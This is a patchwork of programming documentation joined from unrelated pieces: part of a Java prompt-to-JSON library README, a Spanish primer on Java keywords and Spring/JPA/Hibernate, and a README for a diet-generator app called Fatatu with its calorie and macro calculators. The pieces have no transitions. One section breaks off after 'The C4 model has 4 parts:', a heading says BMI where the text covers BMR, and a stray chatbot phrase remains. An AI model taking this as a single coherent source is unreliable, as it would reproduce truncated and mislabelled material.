String prompt = ""Sachin Tendulkar is very good cricket player, he joined the sports on 12 May 2008,"" +
                ""he has played 300 matches and his max score is 400"";
player = (Player)customBuilder.transformIntoPojo(prompt, Player.class.getName(),""Player"",""create player pojo"");
log.info(player.toString()); 
```
This will use Custom Date Serializer 

```
public class DateDeserializer implements JsonDeserializer<Date> {
    private final DateFormat dateFormat;

    public DateDeserializer(String format) {
        this.dateFormat = new SimpleDateFormat(format, Locale.ENGLISH);
    }

    @Override
    public Date deserialize(JsonElement json, Type typeOfT, JsonDeserializationContext context) throws JsonParseException {
        try {
            return dateFormat.parse(json.getAsString().replaceAll(""(st|nd|rd|th),"", "",""));
        } catch (ParseException e) {
            throw new JsonParseException(e);
        }
    }
} 
```

### Convert Prompt to Json String
If you want to convert the Prompt into the Json String 
``` 
 prompt = ""Sachin Tendulkar is very good cricket player, he joined the sports on 12 May 2008,"" +
                ""he has played 300 matches and his max score is 400"";
 //Extract Json from the prompt
 String jsonString = ""{\""lastName\"":\""String\"",\""firstName\"":\""String\""}"";
 jsonString = builder.transformIntoJson(jsonString,prompt,""player"",""get player details"");
 log.info(jsonString);
```

The result will be 

```
""{\""lastName\"":\""Tendulkar\"",\""firstName\"":\""Sachin\""}""; 
```
You can extract custom parameters from the prompt or can convert the entire prompt into JSON

### Convert Prompt to XML
Once you have the JSON you can convert the JSON into XML

```
JSONObject jsonObject = new JSONObject(jsonNode.toString());
String xmlString = XML.toString(jsonObject); 
```

### Break Prompt into Multiple Subprompts and take action

You can have a really long prompt with multiple actions , those prompts will be broken down in multiple subprompts
``` 
@Log
public class ActionExample {
    public static void main(String[] args) throws AIProcessingException {
        ActionProcessor processor = new ActionProcessor();
        String multiPrmpt = ""hey I am in Toronto do you think i can go out without jacket,"" +
                "" also save the weather information , City location and your suggestion in file, "" +
                ""also include places to see"";
        String processed = processor.processMultipleActionDynamically
                (multiPrmpt, 
                        new LoggingHumanDecision(),
                        new LogginggExplainDecision());
        log.info(processed);
    }
}
```
Tools4AI will create a JSon from the prompt

```
{
  ""prmpt"": [
    {
      ""id"": ""1"",
      ""subprompt"": ""What is the weather in Toronto?"",
      ""depend_on"": null
    },
    {
      ""id"": ""2"",
      ""subprompt"": ""Do I need a jacket in this weather?"",
      ""depend_on"": ""1""
    },
    {
      ""id"": ""3"",
      ""subprompt"": ""Save the weather information, city location, and suggestion in a file."",
      ""depend_on"": ""2""
    },
    {
      ""id"": ""4"",
      ""subprompt"": ""Suggest some places to see in Toronto."",
      ""depend_on"": ""3""
    }
  ]
}

```
After that each Subprompt will be processd independently or in dependency order, if the prompts are dependent on each other
then the result from previous prompt will be fed into the next one.

## Tips Importantes:

Exploraremos conceptos fundamentales en Java que son esenciales para comprender y escribir programas efectivos. Estos conceptos son básicos pero críticos para cualquier estudiante de Java, ya que forman la base sobre la cual se construyen programas más complejos y sofisticados. Los términos que abordaremos incluyen public, static, void, private y más. Comencemos desglosando cada uno de estos términos.

1. public
 es un modificador de acceso que se aplica a clases, métodos y variables. Cuando un miembro de una clase se declara como public, está disponible para su acceso desde cualquier otra clase. Es decir, se puede acceder a él desde fuera de la clase donde está definido.

Ejemplo:
```
public class MiClase {
    public int miVariablePublica;
    public void miMetodoPublico() {
        // Código del método
    }
}
```

2. private
 es otro modificador de acceso. Cuando un miembro de una clase se declara como private, solo es accesible dentro de la misma clase. Esto significa que otros objetos o clases no pueden acceder directamente a este miembro.

Ejemplo:
```
public class MiClase {
    private int miVariablePrivada;
    private void miMetodoPrivado() {
        // Código del método
    }
}
```

3. static
 es una palabra clave utilizada para crear campos o métodos que pertenecen a la clase en sí, en lugar de pertenecer a instancias individuales de la clase. Los miembros static se pueden acceder sin la necesidad de crear una instancia de la clase.

Ejemplo:
```
public class MiClase {
    public static int miVariableEstatica;
    public static void miMetodoEstatico() {
        // Código del método
    }
}
```

4. void
 es una palabra clave utilizada para indicar que un método no devuelve ningún valor. Cuando un método tiene un tipo de retorno void, significa que el método realiza ciertas acciones pero no devuelve ningún valor al llamador.

Ejemplo:
```
public class MiClase {
    public void metodoQueNoDevuelveNada() {
        // Código del método
    }
}
```

5. main
 es el punto de entrada para la ejecución de un programa Java. Es el método que se ejecuta cuando se inicia un programa Java y su firma debe ser exactamente como sigue:


```
public static void main(String[] args)
```
Aquí, public indica que el método es accesible desde cualquier otra clase, static indica que el método pertenece a la clase en sí y no a instancias individuales de la clase, void indica que el método no devuelve ningún valor y String[] args es un parámetro que permite pasar argumentos al programa.

Estos conceptos son fundamentales en Java y proporcionan la base para comprender cómo se estructuran y comportan los programas en este lenguaje de programación. Dominar estos conceptos es esencial para cualquier estudiante de Java que desee escribir programas eficientes y bien estructurados.

6. class
 es una palabra clave utilizada para definir una nueva clase en Java. Una clase es un plano, una plantilla o un molde a partir del cual se pueden crear objetos. Define las propiedades (campos) y comportamientos (métodos) comunes a todos los objetos de ese tipo.

Ejemplo:
```
public class MiClase {
    // Campos y métodos de la clase
}
```

7. new
 es una palabra clave utilizada para crear una nueva instancia de una clase. Reserva memoria para el nuevo objeto y llama al constructor de la clase para inicializarlo.

Ejemplo:
```
MiClase objeto = new MiClase();
```

8. return
 es una palabra clave utilizada dentro de un método para devolver un valor al código que llamó al método. Marca el final del método y puede devolver un valor del tipo especificado en la firma del método, si corresponde.

Ejemplo:
```
public int sumar(int a, int b) {
    return a + b;
}
```

9. this
 es una palabra clave que se refiere a la instancia actual de la clase. Se utiliza para diferenciar entre los campos de la clase y los parámetros de los métodos o constructores cuando tienen el mismo nombre.

Ejemplo:
```
public class Persona {
    private String nombre;
    
    public Persona(String nombre) {
        this.nombre = nombre;
    }
}
```

10. final
 es una palabra clave que se puede aplicar a una clase, método o variable. Cuando se aplica a una clase, indica que la clase no puede ser subclaseada. Cuando se aplica a un método, indica que el método no puede ser sobrescrito. Cuando se aplica a una variable, indica que su valor no puede cambiar después de la inicialización.

Ejemplo:
```
public final class MiClaseFinal {
    // Contenido de la clase
}

public class OtraClase {
    public final void metodoFinal() {
        // Código del método
    }
}

public class Ejemplo {
    public final int VALOR = 10;
}
```

11. protected
El modificador protected permite el acceso al miembro al que se aplica desde otras clases en el mismo paquete y también desde subclases, independientemente de si están en el mismo paquete o no.

Ejemplo:
```
public class MiClase {
    protected int miVariableProtegida;
    protected void miMetodoProtegido() {
        // Código del método
    }
}
```

12. default (o sin modificador)
Si no se especifica ningún modificador (también conocido como ""modificador de paquete""), el miembro es accesible solo dentro del mismo paquete. Esto significa que cualquier clase dentro del mismo paquete puede acceder al miembro, pero las clases fuera del paquete no pueden.

Ejemplo:

```
class MiClase {
    int miVariableDePaquete;
    void miMetodoDePaquete() {
        // Código del método
    }
}
```

## Datos interesantes:

### application.properties en Spring Boot:

El archivo application.properties es un archivo de configuración en Spring Boot que se utiliza para definir propiedades específicas de la aplicación. Aquí puedes configurar cosas como la base de datos que la aplicación utilizará, el puerto en el que se ejecutará la aplicación, configuraciones de seguridad, entre otras. Es una forma de personalizar el comportamiento de tu aplicación sin necesidad de cambiar el código fuente.

### JPA (Java Persistence API):

JPA es una API de Java que proporciona un conjunto de especificaciones para trabajar con bases de datos relacionales en aplicaciones Java. Permite a los desarrolladores mapear objetos Java a tablas en una base de datos relacional y viceversa, simplificando el proceso de interactuar con la base de datos. Con JPA, puedes realizar operaciones CRUD (Crear, Leer, Actualizar y Eliminar) en la base de datos de manera más sencilla y utilizando objetos Java.

### Hibernate:

Hibernate es un framework de mapeo objeto-relacional (ORM) para Java. Se utiliza comúnmente junto con JPA para implementar las especificaciones de JPA de manera eficiente. Hibernate simplifica el desarrollo de aplicaciones Java al proporcionar una capa de abstracción sobre la base de datos subyacente, permitiendo a los desarrolladores interactuar con la base de datos utilizando objetos Java en lugar de consultas SQL directas. Esto hace que el desarrollo de aplicaciones que requieren acceso a bases de datos sea más rápido y menos propenso a errores.


### En resumen: 

Mientras que JPA es una especificación estándar para mapear objetos Java a bases de datos relacionales, Hibernate es una implementación popular de esta especificación que simplifica el desarrollo de aplicaciones Java al proporcionar funcionalidades ORM.

# 1. Introduction

---

### 1.1 About Importance of Documentation

Wherever I go, I constantly hear about the importance of documentation in software development. Many times, I've tried
to use a library only to find that the lack of proper documentation made it incredibly difficult to understand and
implement. This experience underscores a critical point: if we, as software developers, want to build software
effectively as teams, we must pay close attention to how we explain our thoughts and code. Good documentation is not
just a nice-to-have; it is essential for collaboration, maintenance, and onboarding new team members. It bridges the gap
between developers' intentions and users' understanding, ensuring that our work is accessible and usable by others.
Without it, even the most elegant code can become an impenetrable black box, hindering productivity and innovation.

### 1.2 What is Fatatu?

Fatatu is a diet generator application that will generate a list of meals with all ingredients and nutrition information
based on provided criteria such as required kcal, diet targets, diet type, etc.
In addition, each diet will provide a shopping list.

With one click you can get a diet and go straight to the shop and buy what you need, you don't need to waste time on
browsing for recipes or adjusting macros. This application will do it for you.

### 1.3 Why this repository exists?

**First reason:** This application was created as an idea that I had in mind for a couple of months/years, and finally I
decided to create it.

**Second reason:** [100commits](https://100commitow.pl/) competitive event gave me motivation to begin this project and
push my skills to the next level.

**Third reason:** I found that creating applications from beginning to the end including deployment is extremely
beneficial in
improving my skills as a Software Developer. With this repository, I decided to learn MongoDB, apply clean architecture,
and
implement comprehensive documentation.

### 1.4 Disclaimer

I am a beginner software developer with less than 2 years of experience who do it as a hobby. I never work in a
professional
environment. I learn everything from books, online courses,
documentation, blogs, forums, YouTube, and AI. Forgive me if something isn't okay in this repo.

### 1.5 Star and share

If you like my work here, you can appreciate me with the star and perhaps share this application with your friends.

Happy coding!

# 2. Architecture

---

This application is simple monolith that utilize clean architecture approach.


## 2.1 Clean Architecture

Clean Architecture, introduced by Robert C. Martin, offers numerous benefits for backend applications. It enforces a
clear separation of concerns, enhancing code manageability and comprehension. This structure improves testability by
decoupling business logic from external dependencies, leading to more robust code. The modularity of Clean Architecture
increases flexibility and maintainability, allowing changes in one part of the application without impacting others. It
also promotes independence from specific frameworks.

Sure, here's a concise overview of each layer in Clean Architecture:

1. Presentation Layer
    - Responsibility: Manages user interactions.
    - Components: UIs, Views, Controllers.
    - Function: Interprets user inputs, displays data.
    - Dependency: Depends on the Application layer.
2. Domain Layer
    - Responsibility: Core business logic and rules.
    - Components: Entities, Value Objects, Domain Services.
    - Function: Defines business concepts and rules.
    - Dependency: Independent, no dependencies.
3. Application Layer
    - Responsibility: Orchestrates business operations.
    - Components: Use Cases, Application Services.
    - Function: Executes operations and coordinates data flow.
    - Dependency: Depends on the Domain layer.
4. Infrastructure Layer
    - Responsibility: Provides technical implementations.
    - Components: Databases, External APIs, Frameworks.
    - Function: Handles technical details and concrete implementations.
    - Dependency: Depends on all other layers.

In the diagram below, we can clearly see that the domain layer doesn't know anything about the application layer. The
same applies to the application layer; it has knowledge about the domain but doesn't know anything about the
infrastructure or presentation layers.

![CleanArchitecture Diagram screenshot](/screenshots/clean-architecture-layer-diagram.png)

Here is another popular diagram that describe clean architecture.

![CleanArchitecture Diagram screenshot](/screenshots/clean-architecture-circle-diagram.webp)

Apart the separation of concerns, another main goal is to keep domain and application layer completely clear from any
frameworks or libraries.
This was nearly archived. The application use lombok library in domain and application layers. Lombok is
lightweight library and allow us to reduce lots of boilerplate code. On the screen we can see usage of lombok
in `Recipe` class where is 10 fields in total. We literally reduced 100 lines of code just to 4 lines.

![Lombok Diagram screenshot](/screenshots/lombok_ss.png)

You may wonder how application layer receive data from database without knowing anything about the infrastructure layer.
The solution is quite interesting. In application layer we create interfaces that are templates and doesn't have any
logic.
Those interfaces are implemented by the infrastructure layer and application layer doesn't need to know how it was done.
UseCase implementation belong to application layer, and usually it need some data from the database. To solve that
problem we simply register
`UseCaseImpl` with `@Bean` in infrastructure layer in `BeanConfiguration` class where we also inject our implementation
of required repository.
As you can see we separate application and domain layers from framework (Spring in this case) completely.

Diagram below show tha basic sample implementation.

![Bean Registration Diagram screenshot](/screenshots/beanregistration_diagram.png)

This approach give us lots of flexibility. We can change our database or the whole framework.
We can rewrite whole infrastructure layer without changing even 1 line in application or domain layers.
Well, in fact our core still depends on infrastructure and presentation layers, those need to be there, but the borders
are clearly created.

Packages according to the clean architecture are presented below:

![Packages screenshot](/screenshots/package_structure_ss.png)

### 2.2 C4 Model

""The C4 model was created as a way to help software development teams describe and communicate software architecture,
both during up-front design sessions and when retrospectively documenting an existing codebase. It's a way to create
maps of your code, at various levels of detail, in the same way you would use something like Google Maps to zoom in and
out of an area you are interested in.""

You can read more about C4 Model at this [LINK](https://c4model.com/)

The C4 model has 4 parts:

# 3. Domain

---

To understand this application first we need to possess the knowledge how human bodies works.

## 3.1 How human body works

### 3.1.1 How kcal Works:

Calories are a measure of energy, and when we talk about food energy, we use the term kilocalories (kcal), commonly
referred to simply as ""calories"" in everyday language. The concept of calorie intake, expenditure, and deficit is
central to understanding weight management.

**Energy Source**: The food we eat provides energy measured in kcal. This energy fuels our body's basic functions (like
breathing and blood circulation), physical activities, and the processing of food itself.

**Energy Expenditure**: Our body uses the energy in several ways:

* Basal Metabolic Rate (BMR): The energy needed for basic functions at rest.
* Physical Activity: The energy expended through exercise and routine daily movements.
* Thermic Effect of Food (TEF): The energy used to digest, absorb, and metabolize food.

Weight management depends on the balance between energy intake (the calories you consume) and energy
expenditure (the calories you burn).

`Change in body weight = Calories consumed − Calories expended`

The number of calories (kcal) required for a person depends on various factors
such as age, gender, weight, height, and physical activity level.

### 3.1.2 BMI

Calculating your Basal Metabolic Rate (BMR) helps you understand how many calories your body needs at rest to maintain
basic physiological functions. The BMR can be estimated using several formulas, with the Harris-Benedict Equation and
the Mifflin-St Jeor Equation being the most commonly used.

This application currently supports the Mifflin-St Jeor equation

Male equation `BMR = (10 × weight in kg) + (6.25 × height in cm)  − (5 × age in years) + 5`

Female equation `BMR = (10 × weight in kg) + (6.25 × height in cm) − (5 × age in years) − 161`

### 3.1.3 TDEE

To calculate the total daily energy expenditure (TDEE), which represents the total number of calories needed to maintain
your current weight, you multiply your Basal Metabolic Rate (BMR) by an activity factor:

- Sedentary (little or no exercise): BMR × 1.2
- Lightly active (light exercise/sports 1-3 days/week): BMR × 1.375
- Moderately active (moderate exercise/sports 3-5 days/week): BMR × 1.55
- Very active (hard exercise/sports 6-7 days a week): BMR × 1.725
- Super active (very hard exercise/sports & a physical job): BMR × 1.9

### 3.1.4 TEF

Calculating thermic effect of food (TEF) is not necessary for average person and currently is not supported. This may
change in the future.

## 3.2 Data representation

The main business entities are `Diet`, `Dish`, `Product`, `Recipe` and `Nutrients`. The application create `Diet` object
that consist
of multiple
`Dish` objects. Those dishes are created from `Recipe` and `Product` objects using `DietGenerator` where special
algorithm is implemented to adjust the `Macronutrient` requirements.
First, lets look closer at `Recipe` and `Product` objects and their sub-objects to understood better how fundamental
data is
represented.

### 3.2.1 Product

```java
public class Product {

    private UUID id;
    private String name;
    private Nutrients nutrients;
    private Filler filler;
}
```

[//]: # (![Product Code screenshot]&#40;/screenshots/product_code_ss.png&#41;)

The Product object is depicted as shown in the screenshot. Besides the obvious fields - name and id (1:1 database
representation), there are two important fields - Nutrients and Filler. During database initialization, products are
fetched from CalorieNinjas
and marked with the appropriate filler. Based on this Filler, the DietGenerator decides if a product can be used to
increase or decrease macronutrients. `Nutrients` is representation of calories, carbohydrates, fats and proteins per
100g of the products.

### 3.2.2 Filler

The `Filler` enum is used to mark products to indicate if a product can be used to adjust macronutrients. In this
application
fillers are set up manually for best and controlled result, but algorithm can be implemented to decide if product is
suitable to be a Filler.

```java
public enum Filler {

    PROTEIN(""Protein""),
    FAT(""Fat""),
    CARBOHYDRATE(""Carbohydrate""),
    NONE(""None"");
}
```

[//]: # (![Filler Code screenshot]&#40;/screenshots/filler_code_ss.png&#41;)

### 3.2.3 Nutrients

```java
public class Nutrients {

    private Calories calories;
    private Carbohydrates carbohydrates;
    private Proteins proteins;
    private Fats fats;
}
```

[//]: # (![Nutrients Code screenshot]&#40;/screenshots/nutrients_code_ss.png&#41;)

The `Nutrients` object contains 3 basic public methods - addNutrients, subtractNutrients and createEmptyNutrients. First
two
return void and take another Nutrients object as parameter.
Those one are widely use across the application to perform subtraction and addition of the nutrients. The last method is
static and is used as starting point for new nutrient calculations.

Calories, Carbohydrates, Proteins and Fats are the classes that holds more specific information and are some kind of
wrappers.

Calories:

```java
public class Calories {
    private BigDecimal totalCalories;
}
```

[//]: # (![Calories Code screenshot]&#40;/screenshots/calories_code_ss.png&#41;)

Carbohydrates:

```java
public class Carbohydrates {
    private BigDecimal totalCarbohydrates;
    private BigDecimal fiber;
    private BigDecimal sugar;
}
```

[//]: # (![Carbohydrates Code screenshot]&#40;/screenshots/carbohydrates_code_ss.png&#41;)

Proteins:

```java
public class Proteins {
    private BigDecimal totalProteins;
}
```

[//]: # (![Proteins Code screenshot]&#40;/screenshots/proteins_code_ss.png&#41;)

Fats:

```java
public class Fats {
    private BigDecimal totalFats;
    private BigDecimal saturatedFats;
}
```

[//]: # (![Fats Code screenshot]&#40;/screenshots/fats_code_ss.png&#41;)

Every of those wrappers contain totalValue field and that is actual field that is used to perform calculations. Let's
look at `Fats` wrapper.
It has totalFats and saturatedFats fields. The saturatedFats amount is part of totalFats value and as you can see the ""
normal"" fats are not listed in the structure.
If you want to get the value of fats WITHOUT saturatedFats you need to perform your own
subtraction `totalFats - saturatedFats`. Knowing this may be useful if you decide to implement glycemic load where you
use value of carbohydrates excluding fiber. For now, glycemic load is not supported in this application and this may
change in the future.

### 3.2.4 Recipe

```java
public class Recipe {

    private UUID id;
    private String name;
    private Map<Product, BigDecimal> ingredientsProportion;
    private Nutrients nutrients;
    private BigDecimal basePortionInGrams;
    private boolean isScalable;
    private String howToPrepare;
    private List<DietType> dietTypes;
    private List<MealType> mealTypes;
    private Set<Filler> scalableFillers;
}
```

[//]: # (![Recipe Code screenshot]&#40;/screenshots/recipe_code_ss.png&#41;)

The `Recipe` object that are used to create base dish during diet creation. It has some useful information such as
dietType that indicate for which diet it can be used, mealTypes that indicate for which meal it can be used. The
ingredientsProportion field store the information about percentage ratio of each `Product` in the recipe. This will
guarantee
the same taste of the base portion when ever we decide to create large or small portion. When we adjust the
macronutrients using
product marked as fillers the ingredients ratio will change but the starting point will be always the same.
It also has a `Nutrients` object that represent nutrition information per 100g of the product.

### 3.2.5 MealType

The `MealType` is simple enum that contain supported meals. In `DietGenerator` class, algorithm use it choose
appropriate `Recipe` for requested diet.

```java
public enum MealType {

    BREAKFAST(""Breakfast""),
    LUNCH(""Lunch""),
    DINNER(""Dinner""),
    SNACK(""Snack"");
}
```

[//]: # (![MealType Code screenshot]&#40;/screenshots/mealtype_code_ss.png&#41;)

### 3.2.6 DietType

The `DietType` is simple enum that contain supported diets. In `DietGenerator` class, algorithm use it choose
appropriate `Recipe` for requested diet. Currently, application support only one type: ""High Protein"". This can be very
easily extended. Each `DietType` has its own `MacroCalculator`.

```java
public enum DietType {

    PROTEIN(""High Protein"");
}
```

[//]: # (![MealType Code screenshot]&#40;/screenshots/diettype_code_ss.png&#41;)

### 3.2.7 BigDecimal

In domain application layer, build in Java class `BigDecimal` is used to perform calculation instead of primitive
variables.
This class support basic math operations including very useful rounding by `RoundingMode` enum. Example usage:

```java
    private BigDecimal calculateCarbohydrates(BigDecimal requiredCalories, BigDecimal totalProteins, BigDecimal totalFats) {
    BigDecimal caloriesLeft = requiredCalories
            .subtract(totalProteins.multiply(BigDecimal.valueOf(4)))
            .subtract(totalFats.multiply(BigDecimal.valueOf(9)));
    return caloriesLeft.divide(BigDecimal.valueOf(4), 1, RoundingMode.HALF_UP);
}
```

[//]: # (![BigDecimal Code Usage screenshot]&#40;/screenshots/bigdecimal_code_example_ss.png&#41;)

Presented method is located in `HighProteinMacroCalculator` and contains chain subtraction, multiplication and division.
Note that scale 1 with `RoundingMode.HALF_UP` has been used to round result to 1 decimal place. Result of multiplication
is used as subtrahend for subtraction.

### 3.2.8 Dish

The `Dish` class is final meal representation class and it is result of `DietGenerator`. This class has factory method
that take `Recipe` and amount of
calories that dish has to has. The productsToGram holds the `Product` to actual value in grams required for that dish
as `BigDecimal`.
`Nutrients` object in this class holds the information about the total nutrients information for the whole meal(--->NOT
PER 100g<---). The recipe filed is the recipe that this dish has been created from. The `Dish` class also contains some
methods that are used to adjust macronutrients.

```java
public class Dish {

    private final Map<Product, BigDecimal> productToGrams;
    private final Nutrients nutrients;
    private final Recipe recipe;
    private final Map<Filler, Integer> numberOfFillers;
}
```

[//]: # (![Dish Code screenshot]&#40;/screenshots/dish_code_ss.png&#41;)

### 3.2.9 Diet

The `Diet` class is final diet representation class and it is returned by `DietGenerator` generateDiet method. It
contains list of dishes that are adjusted to the given `Macronutrient`, total `Nutrients` for the whole diet and
shoppingList that is simple name of the product to the amount in grams. The `Diet` class also contains some methods to
adjust macronutrients.

```java
public class Diet {

    private List<Dish> dishes;
    private Nutrients nutrients;
    private Map<String, Double> shoppingList;
}
```

[//]: # (![Diet Code screenshot]&#40;/screenshots/diet_code_ss.png&#41;)

## 3.3 Calculators

The application features three distinct calculators: `BMICalculator`, `BMRCalculator`, and `MacroCalculator`. The first
two, are standalone calculators. The application includes a dedicated controller
`CalculatorController`, with two endpoints to facilitate their use. The third calculator, `MacroCalculator`, is
particularly important as it is used to create the `Macronutrient` object for the `DietGenerator`.

### 3.3.1 BMICalculator

The `BMICalculator` is simple calculator that return BMI value for given parameters. It has only one static default
method calculate that take 2 parameters - bodyWeightInKg and heightInCm.

The BMI formula utilize metric system and is as follows:

`BMI = bodyWeightInKg / heightInMeters^2`

As you can see on the screen, heightInCm is converted to meters.

```java
public interface BMICalculator {

    static BigDecimal calculate(BigDecimal bodyWeightInKg, BigDecimal heightInCm) {
        if (bodyWeightInKg == null || bodyWeightInKg.doubleValue() <= 0 || heightInCm == null || heightInCm.doubleValue() <= 0)
            return BigDecimal.valueOf(0);

        BigDecimal heightInMeters = heightInCm.divide(new BigDecimal(""100""), new MathContext(3, RoundingMode.HALF_DOWN));
        BigDecimal heightSquared = heightInMeters.multiply(heightInMeters, new MathContext(3, RoundingMode.HALF_DOWN));
        return bodyWeightInKg.divide(heightSquared, new MathContext(3, RoundingMode.HALF_UP));
    }
}
```

[//]: # (![BMICalculator Code screenshot]&#40;/screenshots/bmicalculator_code_ss.png&#41;)

### 3.3.2 BMRCalculator

The `BMRCalculator` is an interface with a single method, calculate, which returns a `BaseMetabolicRate` object. This
method
takes one parameter, `BMRAttributes`, and is implemented by the `MifflinStJeorCalculator`. Other equations can also be
implemented using the `BMRCalculator` interface.

```java
public interface BMRCalculator {
    BaseMetabolicRate calculate(BMRAttributes bmrAttributes);
}
```

[//]: # (![BMRCalculator Code screenshot]&#40;/screenshots/bmrcalculator_code_ss.png&#41;)

This application currently support MifflinStJeor equations which is:

Male: `BMR = ( 10 × bodyWeightInKg in kg ) + ( 6.25 × heightInCm in cm ) − ( 5 × age in years ) + 5`

Female: `BMR=( 10 × bodyWeightInKg in kg ) + ( 6.25 × heightInCm in cm ) − ( 5 × age in years ) − 161`

```java
public class MifflinStJeorCalculator implements BMRCalculator {

    @Override
    public BaseMetabolicRate calculate(BMRAttributes bmrAttributes) {
        if (bmrAttributes == null) return new BaseMetabolicRate(BigDecimal.valueOf(0));
        if (bmrAttributes.getGender() == Gender.MALE)
            return calculateUsingMaleEquation(bmrAttributes);
        else return calculateUsingFemaleEquation(bmrAttributes);
    }
}
```

[//]: # (![MifflinCalculator Code screenshot]&#40;/screenshots/mifflinstjeorcalculator_code_ss.png&#41;)

The `BMRAttributes` are presented below:

```java
public class BMRAttributes {
    private BigDecimal bodyWeightInKg;
    private BigDecimal heightInCm;
    private BigDecimal age;
    private ActiveLevel activeLevel;
    private Gender gender;
}
```

[//]: # (![BMRAttributes Code screenshot]&#40;/screenshots/bmrattributes_code_ss.png&#41;)

The `BaseMetabolicRate` object, created by the `MacroCalculator`, contains the actual value and has a single method,
`calculateTDEE`. This method takes one parameter, `ActiveLevel`. Based on the provided activity level, the base
metabolic
rate is multiplied, and the result is returned as a `BigDecimal`.

```java
public class BaseMetabolicRate {
    private BigDecimal BMR;

    public BigDecimal calculateTDEE(ActiveLevel activeLevel) {
        if (activeLevel == null) return BigDecimal.valueOf(0);
        BigDecimal multiplayer = BigDecimal.valueOf(activeLevel.getMultiplayer());
        return multiplayer.multiply(BMR).setScale(2, RoundingMode.HALF_DOWN);
    }
}
```

[//]: # (![BaseMetabolicRate Code screenshot]&#40;/screenshots/basemetabolicrate_code_ss.png&#41;)

The `ActiveLevel` enum is presented below:

```java
public enum ActiveLevel {
    SEDENTARY(1.2),
    LIGHTLY(1.375),
    MODERATELY(1.55),
    VERY(1.725),
    SUPER(1.9);
}
```

[//]: # (![ActiveLevel Code screenshot]&#40;/screenshots/activelevel_code_ss.png&#41;)

### 3.3.3 MacroCalculator

The `MacroCalculator` is a sealed interface with a single method, `calculate`, which returns a `Macronutrient` object
and
takes one parameter, `MacroCalculatorAttributes`. Each `DietType` requires its own `MacroCalculator` implementation, as
each
diet needs a different approach to macronutrients. For example, an average person who doesn't train should not consume
the same amount of protein as someone who engages in three resistance training sessions per week.

```java
public sealed interface MacroCalculator permits HighProteinMacroCalculator {
    Macronutrient calculate(MacroCalculatorAttributes requiredCalories);
}
```

[//]: # (![MacroCalculator Code screenshot]&#40;/screenshots/macrocalculator_code_ss.png&#41;)

The `MacroCalculator` is created by `MacroCalculatorFactory`.

```java
public class MacroCalculatorFactory {
    public static MacroCalculator getMacroCalculator(DietType dietType) {
        return switch (dietType) {
            case PROTEIN -> new HighProteinMacroCalculator();
            default -> throw new WrongInputException(""Unknown diet type"");
        };
    }
}
```

[//]: # (![MacroCalculatorFactory Code screenshot]&#40;/screenshots/macrocalculatorfactory_code_ss.png&#41;)

The `MacroCalculatorAttributes` is simple record that holds necessary information.

```java
public record MacroCalculatorAttributes(BigDecimal requiredCalories, BigDecimal bodyWeightInKg, Gender gender) {
}
```

[//]: # (![MacroCalculator Code screenshot]&#40;/screenshots/macrocalculatorattributes_code_ss.png&#41;)

The `HighProteinMacroCalculator` is the actual implementation of the `MacroCalculator` and uses its own equation.
Macronutrients are calculated in the order of protein, fats, and carbohydrates.

It is essential to note that each gram of protein and carbohydrate equals 4 kcal, and each gram of fat equals 9 kcal.
These values remain consistent across all diet types.

Proteins: `(2.2g MALE or 1.6g FEMALE) x Body Weight`

Fats: `30% of total caloric intake`

Carbohydrates: `Calculated as the remaining calories after proteins and fats`

Example: Male 100kg that requested 3000kcal diet.

Proteins: `2.2 x 100 = 220g` per day that are `220g x 4kcal = 880kcal` of total daily intake.

Fats: `0.3 x 3000kcal = 900kcal` of total daily intake that are `900 / 9kcal = 100g` of fats.

Carbohydrates: `3000 - (880kcal + 900kcal) = 1220kcal` of total daily intake that are `1220 / 4kcal = 305g`of
carbohydrates per day.

```java
public final class HighProteinMacroCalculator implements MacroCalculator {

    @Override
    public Macronutrient calculate(MacroCalculatorAttributes attributes) {
        if (attributes == null || attributes.requiredCalories() == null || attributes.bodyWeightInKg() == null || attributes.gender() == null) {
            return new Macronutrient(BigDecimal.valueOf(0), BigDecimal.valueOf(0), BigDecimal.valueOf(0), BigDecimal.valueOf(0));
        }
        BigDecimal totalProtein = calculateTotalProtein(attributes.bodyWeightInKg(), attributes.gender());
        BigDecimal totalFats = calculateTotalFats(attributes.requiredCalories());
        BigDecimal totalCarbohydrates = calculateCarbohydrates(attributes.requiredCalories(), totalProtein, totalFats);
        return new Macronutrient(attributes.requiredCalories(), totalProtein, totalFats, totalCarbohydrates);
    }
}

```

[//]: # (![HighProteinMacroCalculator Code screenshot]&#40;/screenshots/highproteinmacrocalculator_code_ss.png&#41;)

The `Macronutrient` serves as a holder for calculated values and is used in the `DietGenerator` to determine whether the
values need to be increased or decreased in the diet. It also has two methods, `reduceValues` and `increaseValues`,
which
take `Nutrients` as a parameter.

```java
public class Macronutrient {
    private BigDecimal calories;
    private BigDecimal proteins;
    private BigDecimal fats;
    private BigDecimal carbohydrates;
}
```

[//]: # (![Macronutrient Code screenshot]&#40;/screenshots/macronutrient_code_ss.png&#41;)

## 3.4 Generators

The application has 2 generators - `ShoppingListGenerator` and `DietGenerator`. First one is very simple, where the
second is rather complex.

### 3.4.1 DietGenerator

The `DietGenerator` is an interface with a single method, `generateDiet`, which does not take any parameters and returns
a
`Diet` object. This interface can be implemented to provide a new generator. In the current application, `DietGenerator`
is
implemented by the `DietGeneratorImpl` class, and this section is dedicated to that implementation.

The `DietGeneratorImpl` is an object created separately for each diet and is garbage collected after the request is
completed. To create it, you need `numberOfMeals` as a `BigDecimal`, a `Macronutrient`, and
a `Map<MealType, List<Recipe>>`. In addition to basic initialization in the constructor, 10% of the total requested
calories is reserved for
macronutrient adjustment. The baseCaloriesPerMeal field is created by subtracting the reserved calories from the total
calories and dividing it by numberOfMeals.

`baseCaloriesPerMeal = (totalCalories - (totalCalories * 0.1)) / numberOfMeals`

```java
public class DietGeneratorImpl implements DietGenerator {

    private final Random random;
    private final Map<MealType, List<Recipe>> recipes;
    private final Macronutrient missingMacronutrients;
    private final BigDecimal numberOfMeals;
    private final BigDecimal baseCaloriesPerMeal;


    public DietGeneratorImpl(BigDecimal numberOfMeals, Macronutrient missingMacronutrients, Map<MealType, List<Recipe>> recipes) {
        this.missingMacronutrients = missingMacronutrients;
        this.numberOfMeals = numberOfMeals;
        BigDecimal reservedCalories = missingMacronutrients.getCalories().multiply(BigDecimal.valueOf(0.1));
        BigDecimal requiredCaloriesAfterReservation = missingMacronutrients.getCalories().subtract(reservedCalories);
        this.baseCaloriesPerMeal = requiredCaloriesAfterReservation.divide(numberOfMeals, 2, RoundingMode.DOWN);
        this.random = new Random();
        this.recipes = recipes;
    }
}
```

